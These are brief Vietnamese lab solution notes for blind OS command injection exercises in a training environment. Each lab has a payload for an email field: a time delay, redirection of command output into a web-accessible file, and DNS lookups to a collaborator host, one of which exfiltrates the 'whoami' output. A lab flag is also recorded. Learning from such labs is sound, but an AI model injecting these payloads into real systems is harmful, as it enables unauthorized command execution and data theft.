# Lab: Blind OS command injection with time delays
## Payload 
Inject vào trường email
```
;sleep 10;
```

![image](https://github.com/user-attachments/assets/e3f73878-3782-4c5e-8eee-4ea6fe99fb14)

# Lab: Blind OS command injection with output redirection
## Payload 
Inject vào trường email
```
;whoami > /var/www/images/alo.txt;
```

![image](https://github.com/user-attachments/assets/a40abd15-fc41-4a60-b192-39d95fb60fd6)

# Lab: Blind OS command injection with out-of-band interaction
## Payload 
Inject vào trường email
```
;nslookup i7qyxq1j56biqqdys413y61u8lec22qr.oastify.com;
```
![image](https://github.com/user-attachments/assets/db9ac0dc-22bd-400b-a938-09d5223432c6)

# Lab: Blind OS command injection with out-of-band data exfiltration
## Payload 
Inject vào trường email
```
; nslookup `whoami`.i7qyxq1j56biqqdys413y61u8lec22qr.oastify.com ;
```
## Flag 
peter-Z8Uewl

![image](https://github.com/user-attachments/assets/3505836c-0335-4a5c-afdb-4cadf5da861a)


